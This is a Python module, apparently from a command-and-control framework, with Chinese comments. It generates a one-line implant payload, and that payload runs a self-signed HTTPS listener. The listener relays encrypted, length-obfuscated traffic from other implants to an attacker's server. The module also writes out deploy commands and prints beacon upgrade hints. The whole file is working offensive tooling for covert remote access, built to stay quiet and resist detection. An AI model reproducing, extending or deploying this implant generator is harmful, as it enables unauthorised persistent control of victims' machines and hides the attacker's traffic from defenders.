"""
@module: agent_https
@desc: 生成 Agent_https 一句话 python 载荷: 植入物 HTTPS POST 连入(TLS 自签), 每请求 TCP 帧中继到 server
@params: host port [server_key_hex] [out_dir] [agent_id]
"""
import json
import os
import secrets

from server.core.bootstrap import deploy_command
from server.s_modules import tls_util
from server.transports.agent_base import relay_code

MODULE = {
    "desc": "生成 Agent_https 一句话 python 载荷(HTTPS POST 隧道中继)",
    "params": [
        ("host", "必填，server 地址"),
        ("port", "必填，server implant 端口"),
        ("server_key_hex", "可选；缺省从 server/config.json 读取 implant_key"),
        ("out_dir", "默认 s_modules/output"),
        ("agent_id", "可选；中继标识，转发 register 时 via=agent_https:<id>"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

_LISTEN_CODE = '''\
import http.server as _hs,ssl as _sl,tempfile as _t,os as _o
class _H(_hs.BaseHTTPRequestHandler):
 protocol_version="HTTP/1.1"
 def log_message(s,*a):
  pass
 def do_POST(s):
  n=int(s.headers.get("Content-Length") or 0)
  body=s.rfile.read(n) if n else b""
  bid=s.path.rsplit("/",1)[-1]
  if not bid or bid=="poll":bid=""
  resp=b""
  try:
   if body:
    m=e.loads(D(body[4:],_AK).decode())
    if not bid:bid=m.get("id","")
    resp=relay_tx(e.dumps(m).encode(),bid)
   else:
    resp=relay_tx(None,bid)
  except Exception:
   resp=b""
  if not resp:resp=e.dumps({"type":"pong"}).encode()
  out=E(resp,_AK)
  out=b.pack(">I",len(out)^int.from_bytes(h.sha256(_AK+b"len").digest()[:4],"big"))+out
  s.send_response(200)
  s.send_header("Content-Type","application/octet-stream")
  s.send_header("Content-Length",str(len(out)))
  s.end_headers()
  try:s.wfile.write(out)
  except:pass
def run():
 cf=_t.NamedTemporaryFile(delete=False,suffix=".pem");cf.write(_CERT.encode());cf.close()
 kf=_t.NamedTemporaryFile(delete=False,suffix=".pem");kf.write(_KEY.encode());kf.close()
 try:
  ctx=_sl.SSLContext(_sl.PROTOCOL_TLS_SERVER)
  ctx.load_cert_chain(cf.name,kf.name)
  httpd=_hs.ThreadingHTTPServer(("0.0.0.0",_LP),_H)
  httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
  httpd.serve_forever()
 finally:
  _o.unlink(cf.name);_o.unlink(kf.name)
run()
'''


def _read_server_key() -> bytes:
    """从 server/config.json 读取 implant_key（agent↔server 用）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
    """生成 Agent_https 代码与部署命令（自签证书）。"""
    port = int(port)
    server_key = None
    if server_key_hex:
        server_key = bytes.fromhex(server_key_hex)
    else:
        server_key = _read_server_key()
        if server_key is None:
            return {"status": "error",
                    "message": "config.json 无有效 implant_key。"
                               "请先 s_exec keygen。"}

    agent_key = secrets.token_bytes(32)
    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    try:
        cert = tls_util.generate_self_signed(host, out_dir)
    except RuntimeError as e:
        return {"status": "error", "message": str(e)}

    listen_port = _pick_listen_port()
    via = f"agent_https:{agent_id}" if agent_id else "agent_https"
    code = relay_code(str(list(server_key)).replace(" ", ""),
                      str(list(agent_key)).replace(" ", ""),
                      host, port, via, long_lived=False)
    code += _LISTEN_CODE.replace("_CERT", repr(cert["cert_pem"])) \
                        .replace("_KEY", repr(cert["key_pem"])) \
                        .replace("_LP", str(listen_port))
    compile(code, "<agent_https>", "exec")  # 生成即校验

    command = deploy_command(code)
    files = {
        "cert": cert["cert_file"],
        "key": cert["key_file"],
        "xor_key": os.path.join(out_dir, "agent_https_key.hex"),
        "command": os.path.join(out_dir, "agent_https_command.txt"),
    }
    with open(files["xor_key"], "w", encoding="utf-8") as f:
        f.write(agent_key.hex() + "\n")
    with open(files["command"], "w", encoding="utf-8") as f:
        f.write(command + "\n")

    return {
        "status": "ok",
        "agent_key": agent_key.hex(),
        "fingerprint": cert["fingerprint"],
        "listen_port": listen_port,
        "deploy": command,
        "code": code,
        "files": files,
        "uplevel_hint": (
            f"载荷升级: s_exec transport_https {host} {listen_port} "
            f"{agent_key.hex()}\n"
            f"然后: uplevel_https <beacon_id> {host} {listen_port} "
            f"{agent_key.hex()}"
        ),
    }


def _pick_listen_port() -> int:
    """临时端口探测（listen 端口与 server 端口错开）。"""
    s = __import__("socket").socket()
    s.bind(("0.0.0.0", 0))
    port = s.getsockname()[1]
    s.close()
    return port


if __name__ == "__main__":
    print("usage: s_exec agent_https <host> <port> [server_key_hex]")
